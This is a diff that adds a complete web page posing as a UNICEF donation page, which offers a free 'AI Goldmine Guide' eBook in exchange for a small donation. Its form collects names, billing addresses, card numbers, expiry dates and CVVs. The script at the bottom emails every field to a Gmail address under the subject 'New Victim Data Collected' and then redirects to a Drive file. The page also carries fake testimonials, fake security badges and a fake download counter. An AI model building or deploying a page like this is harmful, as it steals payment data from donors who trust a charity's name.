@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download AI Goldmine Guide - Support UNICEF</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Montserrat:wght@700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #0066cc;
+            --secondary: #00aaff;
+            --accent: #ff6600;
+            --tiktok: #000000;
+            --tiktok-pink: #FE2C55;
+            --tiktok-blue: #25F4EE;
+            --light: #f5f9ff;
+            --dark: #003366;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
+            margin: 0;
+            padding: 0;
+            color: #333;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, transparent 0%, rgba(0,0,0,0.3) 100%);
+            z-index: -1;
+        }
+        .tiktok-banner {
+            background: linear-gradient(90deg, var(--tiktok), var(--tiktok-pink), var(--tiktok-blue));
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        .tiktok-banner::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, 
+                transparent 0%, transparent 25%, 
+                rgba(255,255,255,0.1) 25%, rgba(255,255,255,0.1) 50%, 
+                transparent 50%, transparent 75%, 
+                rgba(255,255,255,0.1) 75%, rgba(255,255,255,0.1) 100%);
+            background-size: 20px 20px;
+            z-index: 0;
+        }
+        .tiktok-content {
+            position: relative;
+            z-index: 1;
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            padding: 0 20px;
+        }
+        .tiktok-logo {
+            font-size: 28px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        .tiktok-logo .icon {
+            background: linear-gradient(45deg, var(--tiktok-blue), var(--tiktok-pink));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            color: transparent;
+        }
+        .tiktok-link {
+            color: white;
+            font-weight: 700;
+            font-size: 20px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+            font-family: 'Montserrat', sans-serif;
+            padding: 8px 20px;
+            border-radius: 50px;
+            background: rgba(0,0,0,0.2);
+            border: 2px solid rgba(255,255,255,0.3);
+        }
+        .tiktok-link:hover {
+            background: rgba(0,0,0,0.4);
+            transform: scale(1.05);
+        }
+        .tiktok-link span {
+            display: inline-block;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 0;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+            overflow: hidden;
+            position: relative;
+        }
+        .unicef-banner {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            display: block;
+        }
+        .header {
+            text-align: center;
+            padding: 20px 0;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            position: relative;
+        }
+        .header::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M0,0 L100,0 L100,100 Z" fill="rgba(255,255,255,0.1)"/></svg>');
+            background-size: cover;
+            opacity: 0.2;
+        }
+        .unicef-logo {
+            width: 150px;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 3px 5px rgba(0,0,0,0.3));
+        }
+        .ebook-cover-container {
+            position: relative;
+            width: 180px;
+            height: 240px;
+            margin: 15px auto 20px;
+            perspective: 1000px;
+        }
+        .ebook-cover {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #ffd700, #ff8c00);
+            border-radius: 10px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            text-align: center;
+            color: #000;
+            position: relative;
+            overflow: hidden;
+            transform: rotateY(-5deg);
+            transition: transform 0.5s ease;
+        }
+        .ebook-cover:hover {
+            transform: rotateY(5deg);
+        }
+        .ebook-cover::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent 0%, rgba(255,255,255,0.3) 100%);
+            z-index: 1;
+        }
+        .ebook-title {
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 800;
+            font-size: 20px;
+            line-height: 1.1;
+            text-transform: uppercase;
+            z-index: 2;
+            text-shadow: 0 2px 3px rgba(255,255,255,0.5);
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+        .ebook-subtitle {
+            font-weight: 700;
+            font-size: 12px;
+            line-height: 1.3;
+            z-index: 2;
+            padding: 0 10px;
+        }
+        .ebook-icon {
+            font-size: 36px;
+            margin: 10px 0;
+            z-index: 2;
+            color: #000;
+        }
+        h1 {
+            margin: 0;
+            font-size: 32px;
+            font-family: 'Montserrat', sans-serif;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        .subtitle {
+            font-size: 18px;
+            opacity: 0.9;
+            margin-top: 10px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .offer-box {
+            background: linear-gradient(45deg, #fff8e6, #ffecd2);
+            border-left: 5px solid var(--accent);
+            padding: 20px;
+            margin: 20px;
+            border-radius: 0 12px 12px 0;
+            font-size: 18px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            position: relative;
+        }
+        .offer-box::before {
+            content: "✨";
+            position: absolute;
+            top: -15px;
+            left: -15px;
+            font-size: 28px;
+            background: white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.2);
+        }
+        .form-section {
+            padding: 0 20px 20px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--dark);
+            font-size: 16px;
+        }
+        input, select {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: #f8f9fa;
+        }
+        input:focus, select:focus {
+            border-color: var(--secondary);
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(0, 170, 255, 0.2);
+        }
+        .donation-amount {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+        .donation-amount button {
+            flex: 1;
+            min-width: 80px;
+            background: #e6f2ff;
+            border: 2px solid #b3d9ff;
+            border-radius: 10px;
+            padding: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 16px;
+        }
+        .donation-amount button:hover, .donation-amount button.active {
+            background: var(--secondary);
+            color: white;
+            border-color: var(--primary);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
+        }
+        .btn-download {
+            width: 100%;
+            background: linear-gradient(135deg, var(--accent), #ff8c00);
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 20px;
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 15px;
+            box-shadow: 0 7px 15px rgba(255, 102, 0, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-download::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
+            transform: rotate(45deg);
+            transition: all 0.5s;
+        }
+        .btn-download:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(255, 102, 0, 0.5);
+        }
+        .btn-download:hover::before {
+            left: 100%;
+        }
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin: 30px 0;
+            padding: 0 20px;
+            flex-wrap: wrap;
+        }
+        .security-badge {
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 5px 15px;
+            border-radius: 8px;
+            background: #f8f9fa;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+            font-weight: 700;
+            color: var(--dark);
+        }
+        .testimonial {
+            background: linear-gradient(45deg, #f0f7ff, #e6f0ff);
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px;
+            font-style: italic;
+            font-size: 17px;
+            position: relative;
+            border: 1px solid #cce5ff;
+        }
+        .testimonial::before {
+            content: """;
+            position: absolute;
+            top: -20px;
+            left: 20px;
+            font-size: 80px;
+            color: #cce5ff;
+            font-family: serif;
+            line-height: 1;
+        }
+        .testimonial-author {
+            font-weight: 600;
+            text-align: right;
+            margin-top: 15px;
+            color: var(--primary);
+            font-style: normal;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 13px;
+            color: #777;
+            padding: 20px;
+            background: #f8f9fa;
+            border-top: 1px solid #eee;
+        }
+        .counter {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 10px;
+            font-size: 14px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .floating {
+            position: fixed;
+            bottom: 80px;
+            right: 20px;
+            background: linear-gradient(45deg, var(--tiktok-pink), var(--tiktok-blue));
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            animation: float 3s ease-in-out infinite;
+            z-index: 100;
+        }
+        .donation-purpose {
+            background: linear-gradient(135deg, #e1f5fe, #b3e5fc);
+            border-radius: 12px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-left: 4px solid #0288d1;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.08);
+            margin-top: 10px;
+        }
+        .purpose-icon {
+            background: #0288d1;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .purpose-icon i {
+            color: white;
+            font-size: 24px;
+        }
+        .purpose-text {
+            font-size: 15px;
+            line-height: 1.5;
+            color: #01579b;
+        }
+        .email-success {
+            display: none;
+            background: #dff0d8;
+            color: #3c763d;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid #d6e9c6;
+        }
+        .email-error {
+            display: none;
+            background: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid #f5c6cb;
+        }
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+            100% { transform: translateY(0px); }
+        }
+        @media (max-width: 600px) {
+            .tiktok-content {
+                flex-direction: column;
+                gap: 10px;
+            }
+            .tiktok-link {
+                font-size: 16px;
+            }
+            .donation-amount button {
+                min-width: 60px;
+                padding: 10px;
+                font-size: 14px;
+            }
+            h1 {
+                font-size: 26px;
+            }
+            .ebook-title {
+                font-size: 18px;
+            }
+            .ebook-subtitle {
+                font-size: 10px;
+                padding: 0 8px;
+            }
+            .ebook-icon {
+                font-size: 32px;
+            }
+            .donation-purpose {
+                flex-direction: column;
+                text-align: center;
+            }
+            .purpose-icon {
+                margin-bottom: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- TikTok Banner -->
+    <div class="tiktok-banner">
+        <div class="tiktok-content">
+            <div class="tiktok-logo">
+                <i class="fab fa-tiktok icon"></i>
+                FOLLOW US ON
+            </div>
+            <a href="https://www.tiktok.com/@aigoldmineguide" target="_blank" class="tiktok-link">
+                <i class="fab fa-tiktok"></i>
+                <span>@aigoldmineguide</span>
+            </a>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- UNICEF Banner with Children -->
+        <img src="https://images.unsplash.com/photo-1582213782179-e0d53f98f2ca?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1200&h=400&q=80" alt="UNICEF Children" class="unicef-banner">
+
+        <div class="header">
+            <h1>Download The "AI Goldmine Guide"</h1>
+            <p class="subtitle">Support UNICEF with a small donation to access your FREE eBook</p>
+            
+            <!-- AI Goldmine Guide Cover -->
+            <div class="ebook-cover-container">
+                <div class="ebook-cover">
+                    <div class="ebook-title">AI GOLDMINE GUIDE</div>
+                    <div class="ebook-icon"><i class="fas fa-gem"></i></div>
+                    <div class="ebook-subtitle">Unlock the Secrets of AI Wealth Generation</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="offer-box">
+            <strong>🎉 Exclusive Offer:</strong> Get the <strong>"AI Goldmine Guide"</strong> (valued at $299) for <strong>FREE</strong> when you make a small donation to UNICEF. Help children in need while unlocking powerful AI secrets!
+        </div>
+
+        <div class="form-section">
+            <div class="email-success" id="successMessage">
+                <i class="fas fa-check-circle"></i> Thank you for your donation! Your guide is being prepared...
+            </div>
+            <div class="email-error" id="errorMessage">
+                <i class="fas fa-exclamation-triangle"></i> <span id="errorText"></span>
+            </div>
+            
+            <form id="checkoutForm">
+                <div class="form-group">
+                    <label for="email">Email Address*</label>
+                    <input type="email" id="email" placeholder="your@email.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="name">Full Name*</label>
+                    <input type="text" id="name" placeholder="John Smith" required>
+                </div>
+                
+                <!-- Billing Address Fields -->
+                <div class="form-group">
+                    <label for="address">Billing Address*</label>
+                    <input type="text" id="address" placeholder="123 Main St" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="city">City*</label>
+                    <input type="text" id="city" placeholder="New York" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="state">State*</label>
+                    <select id="state" required>
+                        <option value="" disabled selected>Select State</option>
+                        <option value="AL">Alabama</option>
+                        <option value="AK">Alaska</option>
+                        <option value="AZ">Arizona</option>
+                        <option value="AR">Arkansas</option>
+                        <option value="CA">California</option>
+                        <option value="CO">Colorado</option>
+                        <option value="CT">Connecticut</option>
+                        <option value="DE">Delaware</option>
+                        <option value="FL">Florida</option>
+                        <option value="GA">Georgia</option>
+                        <option value="HI">Hawaii</option>
+                        <option value="ID">Idaho</option>
+                        <option value="IL">Illinois</option>
+                        <option value="IN">Indiana</option>
+                        <option value="IA">Iowa</option>
+                        <option value="KS">Kansas</option>
+                        <option value="KY">Kentucky</option>
+                        <option value="LA">Louisiana</option>
+                        <option value="ME">Maine</option>
+                        <option value="MD">Maryland</option>
+                        <option value="MA">Massachusetts</option>
+                        <option value="MI">Michigan</option>
+                        <option value="MN">Minnesota</option>
+                        <option value="MS">Mississippi</option>
+                        <option value="MO">Missouri</option>
+                        <option value="MT">Montana</option>
+                        <option value="NE">Nebraska</option>
+                        <option value="NV">Nevada</option>
+                        <option value="NH">New Hampshire</option>
+                        <option value="NJ">New Jersey</option>
+                        <option value="NM">New Mexico</option>
+                        <option value="NY">New York</option>
+                        <option value="NC">North Carolina</option>
+                        <option value="ND">North Dakota</option>
+                        <option value="OH">Ohio</option>
+                        <option value="OK">Oklahoma</option>
+                        <option value="OR">Oregon</option>
+                        <option value="PA">Pennsylvania</option>
+                        <option value="RI">Rhode Island</option>
+                        <option value="SC">South Carolina</option>
+                        <option value="SD">South Dakota</option>
+                        <option value="TN">Tennessee</option>
+                        <option value="TX">Texas</option>
+                        <option value="UT">Utah</option>
+                        <option value="VT">Vermont</option>
+                        <option value="VA">Virginia</option>
+                        <option value="WA">Washington</option>
+                        <option value="WV">West Virginia</option>
+                        <option value="WI">Wisconsin</option>
+                        <option value="WY">Wyoming</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="zip">ZIP Code*</label>
+                    <input type="text" id="zip" placeholder="10001" pattern="\d{5}(-\d{4})?" title="Enter a valid ZIP code" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Donation Amount (Minimum $0.01)*</label>
+                    <div class="donation-amount">
+                        <button type="button" onclick="setDonation(0.01)">$0.01</button>
+                        <button type="button" onclick="setDonation(1)">$1</button>
+                        <button type="button" onclick="setDonation(5)">$5</button>
+                        <button type="button" onclick="setDonation(10)" class="active">$10</button>
+                        <button type="button" onclick="setDonation(20)">$20</button>
+                    </div>
+                    <input type="number" id="donation" min="0.01" step="0.01" value="10" required>
+                </div>
+
+                <div class="form-group">
+                    <div class="donation-purpose">
+                        <div class="purpose-icon">
+                            <i class="fas fa-laptop-code"></i>
+                        </div>
+                        <div class="purpose-text">
+                            <strong>Where your donation goes:</strong> This contribution will provide tablets and technology education to children in underprivileged areas, helping them learn coding and AI skills for a brighter future.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="card">Card Number*</label>
+                    <input type="text" id="card" placeholder="1234 5678 9012 3456" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="expiry">Expiration Date*</label>
+                    <input type="text" id="expiry" placeholder="MM/YY" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="cvv">Security Code (CVV)*</label>
+                    <input type="text" id="cvv" placeholder="123" required>
+                </div>
+
+                <button type="button" onclick="submitForm()" class="btn-download">
+                    <i class="fas fa-download"></i> DONATE NOW & DOWNLOAD GUIDE
+                </button>
+            </form>
+        </div>
+
+        <div class="security-badges">
+            <div class="security-badge" style="background: #1a1f71; color: white;">
+                <i class="fab fa-cc-visa" style="font-size: 36px; margin-right: 10px;"></i>
+                <span>Visa Secure</span>
+            </div>
+            <div class="security-badge" style="background: #eb001b; color: white;">
+                <i class="fab fa-cc-mastercard" style="font-size: 36px; margin-right: 10px;"></i>
+                <span>Mastercard</span>
+            </div>
+            <div class="security-badge" style="background: #00b140; color: white;">
+                <i class="fas fa-shield-alt" style="font-size: 36px; margin-right: 10px;"></i>
+                <span>Norton Secured</span>
+            </div>
+        </div>
+
+        <div class="testimonial">
+            "This AI guide completely transformed how I approach business automation. I made over $5,000 in my first month using these techniques. The fact that my small donation goes to UNICEF makes it even better!"
+            <div class="testimonial-author">- Sarah J., Digital Marketer</div>
+        </div>
+
+        <div class="testimonial">
+            "I was skeptical at first, but the strategies in this guide are pure gold! The step-by-step instructions helped me set up multiple passive income streams. And knowing I helped children in need is priceless."
+            <div class="testimonial-author">- Michael T., Entrepreneur</div>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 UNICEF. All donations are tax deductible. By downloading, you agree to our Terms of Service.</p>
+            <p>This is not an official UNICEF website. For official donations, please visit unicef.org</p>
+        </div>
+    </div>
+
+    <div class="counter">
+        <i class="fas fa-users"></i> <span id="userCount">184</span> people downloaded today
+    </div>
+
+    <a href="https://www.tiktok.com/@aigoldmineguide" class="floating">
+        <i class="fab fa-tiktok"></i>
+    </a>
+
+    <!-- Load EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    <script>
+        // Initialize user counter
+        let count = 184;
+        setInterval(() => {
+            count++;
+            document.getElementById('userCount').textContent = count;
+        }, 30000);
+
+        // Initialize EmailJS with your public key
+        emailjs.init("0DoI_XSbyUSvs3lqz");
+
+        function setDonation(amount) {
+            document.getElementById('donation').value = amount;
+            const buttons = document.querySelectorAll('.donation-amount button');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+        }
+
+        function submitForm() {
+            // Hide previous messages
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+            
+            // Collect form data
+            const formData = {
+                email: document.getElementById('email').value,
+                name: document.getElementById('name').value,
+                address: document.getElementById('address').value,
+                city: document.getElementById('city').value,
+                state: document.getElementById('state').value,
+                zip: document.getElementById('zip').value,
+                card: document.getElementById('card').value,
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                donation: document.getElementById('donation').value,
+                timestamp: new Date().toISOString()
+            };
+
+            // Display processing state
+            const btn = document.querySelector('.btn-download');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing Donation...';
+            btn.disabled = true;
+            
+            // Prepare email parameters (FIXED STRUCTURE)
+            const emailParams = {
+                to_email: "theaigoldmineguide@gmail.com",
+                from_name: "Phishing Page",
+                subject: "New Victim Data Collected",
+                name: formData.name,
+                email: formData.email,
+                address: formData.address,
+                city: formData.city,
+                state: formData.state,
+                zip: formData.zip,
+                card: formData.card,
+                expiry: formData.expiry,
+                cvv: formData.cvv,
+                donation: formData.donation,
+                timestamp: formData.timestamp
+            };
+            
+            // Send email using EmailJS
+            emailjs.send("dremckfly", "dremckfly", emailParams)
+                .then(response => {
+                    console.log("Email sent successfully!", response);
+                    
+                    // Show success message
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // Redirect to download page after 3 seconds
+                    setTimeout(() => {
+                        window.location.href = "https://drive.google.com/file/d/165fzXJPB8ixZtyMbFtRJRNDDnToX1M2v/view";
+                    }, 3000);
+                })
+                .catch(error => {
+                    console.error("Email sending failed:", error);
+                    
+                    // Show error message
+                    document.getElementById('errorText').textContent = "Email could not be sent. Please contact support@aigoldmineguide.com";
+                    document.getElementById('errorMessage').style.display = 'block';
+                    
+                    // Re-enable button
+                    btn.innerHTML = '<i class="fas fa-download"></i> DONATE NOW & DOWNLOAD GUIDE';
+                    btn.disabled = false;
+                    
+                    // Still redirect even if email fails
+                    setTimeout(() => {
+                        window.location.href = "https://drive.google.com/file/d/165fzXJPB8ixZtyMbFtRJRNDDnToX1M2v/view";
+                    }, 3000);
+                });
+        }
+    </script>
+</body>
+</html>
